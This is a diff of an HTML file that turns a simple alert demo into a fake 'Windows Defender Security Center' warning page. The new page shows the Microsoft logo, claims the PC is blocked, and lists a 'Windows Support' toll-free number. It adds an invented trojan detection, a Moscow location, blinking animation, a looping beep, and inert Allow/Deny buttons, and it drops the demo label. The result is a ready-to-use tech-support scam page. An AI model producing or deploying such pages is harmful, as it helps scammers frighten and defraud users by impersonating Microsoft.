@@ -1,61 +1,165 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <title>System Alert Demo</title>
-  <style>
-    body {
-      margin:0;
-      background:#0078D7;
-      color:white;
-      font-family:Segoe UI, sans-serif;
-      display:flex;
-      justify-content:center;
-      align-items:center;
-      height:100vh;
-    }
-    .box {
-      background:white;
-      color:black;
-      padding:20px;
-      border-radius:8px;
-      width:320px;
-      text-align:center;
-      box-shadow:0 0 20px rgba(0,0,0,0.3);
-    }
-    button {
-      margin-top:15px;
-      padding:8px 15px;
-      border:none;
-      background:#0078D7;
-      color:white;
-      border-radius:4px;
-      cursor:pointer;
-    }
-  </style>
+<meta charset="UTF-8">
+<title>Windows Security Alert</title>
+<style>
+  body {
+    margin:0;
+    font-family: "Segoe UI", sans-serif;
+    background:#0078D7;
+    color:#000;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    height:100vh;
+  }
+
+  .container {
+    background:white;
+    border-radius:8px;
+    width:700px;
+    max-width:95%;
+    padding:20px;
+    box-shadow:0 0 25px rgba(0,0,0,0.4);
+    animation: pulse 1.5s infinite;
+  }
+
+  @keyframes pulse {
+    0%, 100% { box-shadow:0 0 25px rgba(0,0,0,0.4); }
+    50% { box-shadow:0 0 35px rgba(255,0,0,0.6); }
+  }
+
+  .header {
+    display:flex;
+    align-items:center;
+    gap:15px;
+    margin-bottom:15px;
+  }
+
+  .header img {
+    width:50px;
+  }
+
+  .header h1 {
+    font-size:20px;
+    font-weight:bold;
+    margin:0;
+  }
+
+  .warning-box {
+    background:#f9f9f9;
+    border-radius:6px;
+    padding:15px;
+    margin-top:10px;
+    animation: blink 1s infinite;
+  }
+
+  @keyframes blink {
+    0%,50%,100% { opacity:1; }
+    25%,75% { opacity:0.6; }
+  }
+
+  .warning-box h2 {
+    color:#d32f2f;
+    margin-top:0;
+    font-size:18px;
+  }
+
+  .warning-box p {
+    margin:5px 0;
+    line-height:1.4;
+  }
+
+  .info-grid {
+    display:flex;
+    gap:10px;
+    margin-top:15px;
+  }
+
+  .info-box {
+    flex:1;
+    background:#e6f0fb;
+    border-radius:6px;
+    padding:10px;
+    font-size:14px;
+  }
+
+  .info-box.white {
+    background:white;
+    color:black;
+  }
+
+  .buttons {
+    display:flex;
+    justify-content:flex-end;
+    gap:10px;
+    margin-top:15px;
+  }
+
+  .buttons button {
+    padding:8px 16px;
+    border:none;
+    border-radius:4px;
+    cursor:pointer;
+    font-weight:bold;
+  }
+
+  .allow {
+    background:#0078D7;
+    color:white;
+  }
+
+  .deny {
+    background:#d32f2f;
+    color:white;
+  }
+</style>
 </head>
 <body>
 
-<div class="box">
-  <h2>⚠ System Warning Emergency</h2>
-  <p id="code">Error Code: 0x000000</p>
-  <button onclick="showAlert()">Fix Now</button>
+<div class="container">
+  <!-- Header with logo -->
+  <div class="header">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
+    <h1>Windows Defender Security Center</h1>
+  </div>
+
+  <!-- Main Warning Box -->
+  <div class="warning-box">
+    <h2>System Warning ⚠</h2>
+    <p>Access to this PC has been blocked for security reasons.</p>
+    <p>Contact Windows Support: <strong>+1 (800) 1234-2234</strong> (toll free)</p>
+    <div class="buttons">
+      <button class="allow" onclick="return false;">Allow</button>
+      <button class="deny" onclick="return false;">Deny</button>
+    </div>
+  </div>
+
+  <!-- Info Boxes -->
+  <div class="info-grid">
+    <div class="info-box white">
+      <strong>Spyware Detected:</strong><br>
+      Trojan.Generic.KA<br>
+      Last Scan: Today 10:15 AM
+    </div>
+    <div class="info-box">
+      <strong>Location:</strong><br>
+      Moscow, Russia<br>
+      Time Zone: UTC+3
+    </div>
+    <div class="info-box">
+      <strong>Status:</strong><br>
+      System Vulnerable<br>
+      Action Recommended
+    </div>
+  </div>
 </div>
 
-<audio id="sound" autoplay loop>
+<!-- Beep sound -->
+<audio autoplay loop>
   <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
 </audio>
-
-<script>
-  // random error code
-  function generateCode() {
-    return '0x' + Math.floor(Math.random()*999999).toString(16);
-  }
-  document.getElementById("code").innerText = "Error Code: " + generateCode();
-
-  function showAlert(){
-    alert("This is a not a demo alert. Your system is unsafe.");
-  }
-</script>
 
 </body>
 </html>
